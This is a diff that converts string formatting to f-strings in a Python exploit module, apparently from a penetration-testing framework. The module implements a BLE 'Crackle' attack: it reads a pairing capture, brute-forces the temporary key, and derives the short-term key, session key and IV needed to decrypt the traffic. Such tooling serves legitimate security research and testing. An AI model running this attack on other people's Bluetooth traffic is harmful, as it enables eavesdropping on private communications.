@@ -314,13 +314,13 @@ class Exploit(Exploit):
 
         Parses CONNECT_REQ, SMP exchanges, and LL Control PDUs.
         """
-        print_status("Parsing BLE PCAP: {}".format(self.pcap_file))
+        print_status(f"Parsing BLE PCAP: {self.pcap_file}")
         state = PairingState()
 
         try:
             packets = rdpcap(self.pcap_file)
         except Exception as err:
-            print_error("Failed to read PCAP: {}".format(err))
+            print_error(f"Failed to read PCAP: {err}")
             return None
 
         for pkt in packets:
@@ -402,7 +402,7 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("BLE Crackle Configuration:")
-            print_info("  PCAP:     {}".format(self.pcap_file))
+            print_info(f"  PCAP:     {self.pcap_file}")
             print_info("  Known TK: {}".format(self.known_tk if self.known_tk >= 0 else "(brute-force)"))
             return
 
@@ -422,24 +422,24 @@ class Exploit(Exploit):
 
         if state.lesc_debug_key:
             print_success("LESC Debug Key detected! Connection uses BT SIG debug key.")
-            print_info("Private key: {}".format(LESC_DEBUG_PRIVATE_KEY.hex()))
+            print_info(f"Private key: {LESC_DEBUG_PRIVATE_KEY.hex()}")
             print_info("All traffic is decryptable with the known debug private key.")
             return
 
         if state.ltk:
-            print_success("LTK found in plaintext: {}".format(state.ltk.hex()))
+            print_success(f"LTK found in plaintext: {state.ltk.hex()}")
             return
 
         if self.known_tk >= 0:
             state.tk = self.known_tk
-            print_info("Using known TK: {}".format(self.known_tk))
+            print_info(f"Using known TK: {self.known_tk}")
         else:
             print_status("Brute-forcing TK (0 to {}, {} workers)...".format(
                 MAX_TK, self.workers or "auto"))
             tk = brute_force_tk(state, workers=self.workers)
             if tk is not None:
                 state.tk = tk
-                print_success("TK cracked: {} (0x{:06x})".format(tk, tk))
+                print_success(f"TK cracked: {tk} (0x{tk:06x})")
             else:
                 print_error("TK not found. Pairing may use LE Secure Connections "
                             "or data is incomplete.")
@@ -447,18 +447,18 @@ class Exploit(Exploit):
 
         if state.mrand and state.srand and state.tk is not None:
             state.stk = calc_stk(state.mrand, state.srand, state.tk)
-            print_info("STK: {}".format(state.stk.hex()))
+            print_info(f"STK: {state.stk.hex()}")
 
         if state.stk and state.skdm and state.skds:
             state.session_key = calc_session_key(state.stk, state.skdm, state.skds)
-            print_info("Session Key: {}".format(state.session_key.hex()))
+            print_info(f"Session Key: {state.session_key.hex()}")
 
         if state.ivm and state.ivs:
             state.iv = calc_iv(state.ivm, state.ivs)
-            print_info("IV: {}".format(state.iv.hex()))
+            print_info(f"IV: {state.iv.hex()}")
 
         print_success("BLE cracking complete. Results:")
-        print_info("  TK:          {}".format(state.tk))
+        print_info(f"  TK:          {state.tk}")
         print_info("  STK:         {}".format(state.stk.hex() if state.stk else "N/A"))
         print_info("  Session Key: {}".format(state.session_key.hex() if state.session_key else "N/A"))
         print_info("  LTK:         {}".format(state.ltk.hex() if state.ltk else "N/A"))
